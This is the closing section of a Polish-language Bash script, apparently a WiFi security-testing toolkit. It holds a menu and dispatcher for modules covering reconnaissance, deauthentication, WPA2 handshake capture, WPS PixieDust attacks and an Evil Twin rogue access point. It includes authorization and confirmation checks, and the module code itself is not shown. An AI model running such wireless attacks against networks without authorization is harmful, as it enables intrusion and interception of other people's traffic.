    echo -e "${BOLD}Docelowe:  ${CYAN}${TARGET_SSIDS[*]}${NC}"
    echo ""
    separator
    echo ""
    echo -e "  ${CYAN}1)${NC}  ${BOLD}Rekonesans${NC}              - Skan sieci WiFi w otoczeniu"
    echo -e "  ${CYAN}2)${NC}  ${BOLD}Analiza zabezpieczeń${NC}    - Szyfrowanie, WPS, PMKID, MFP"
    echo -e "  ${CYAN}3)${NC}  ${BOLD}Test deautentykacji${NC}     - Odporność na atak deauth"
    echo -e "  ${CYAN}4)${NC}  ${BOLD}Przechwycenie handshake${NC} - Capture WPA2 4-way handshake"
    echo -e "  ${CYAN}5)${NC}  ${BOLD}Test WPS${NC}                - PixieDust, WPS PIN"
    echo -e "  ${CYAN}6)${NC}  ${BOLD}Evil Twin / Rogue AP${NC}    - Fałszywy punkt dostępowy"
    echo -e "  ${CYAN}7)${NC}  ${BOLD}Izolacja klientów${NC}       - Segmentacja, VLAN, zarządzanie"
    echo -e "  ${CYAN}8)${NC}  ${BOLD}Generuj raport${NC}          - Kompilacja wyników do pliku"
    echo ""
    separator
    echo ""
    echo -e "  ${CYAN}A)${NC}  ${GREEN}Uruchom WSZYSTKO (1-7 po kolei, raport na końcu)${NC}"
    echo -e "  ${CYAN}Q)${NC}  ${RED}Wyjście${NC}"
    echo ""
}

run_all_modules() {
    log STEP "URUCHAMIANIE WSZYSTKICH MODUŁÓW"
    echo -e "${YELLOW}Zostaną uruchomione kolejno moduły 1-7, a na końcu raport.${NC}"
    echo -e "${YELLOW}Przy każdym module będziesz pytany o potwierdzenie.${NC}"
    echo ""

    if ! confirm "Rozpocząć pełny test?"; then
        return
    fi

    module_recon || log WARN "Moduł 1 zakończony z problemami."
    module_security_analysis || log WARN "Moduł 2 zakończony z problemami."
    module_deauth_test || log WARN "Moduł 3 zakończony z problemami."
    module_handshake || log WARN "Moduł 4 zakończony z problemami."
    module_wps_test || log WARN "Moduł 5 zakończony z problemami."
    module_evil_twin || log WARN "Moduł 6 zakończony z problemami."
    module_client_isolation || log WARN "Moduł 7 zakończony z problemami."
    module_report || log WARN "Moduł 8 zakończony z problemami."
}

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

main() {
    banner
    check_root
    check_authorization
    install_missing_tools
    select_interface
    setup_results_dir

    log OK "Inicjalizacja zakończona. Gotowy do testów."
    press_enter

    while true; do
        show_menu
        echo -ne "${YELLOW}[?]${NC} Wybierz opcję: "
        read -r choice

        case "$choice" in
            1) module_recon || true ;;
            2) module_security_analysis || true ;;
            3) module_deauth_test || true ;;
            4) module_handshake || true ;;
            5) module_wps_test || true ;;
            6) module_evil_twin || true ;;
            7) module_client_isolation || true ;;
            8) module_report || true ;;
            [aA]) run_all_modules || true ;;
            [qQ])
                log INFO "Zamykanie..."
                exit 0
                ;;
            *)
                echo -e "${RED}Nieznana opcja: ${choice}${NC}"
                sleep 1
                ;;
        esac
    done
}

main "$@"
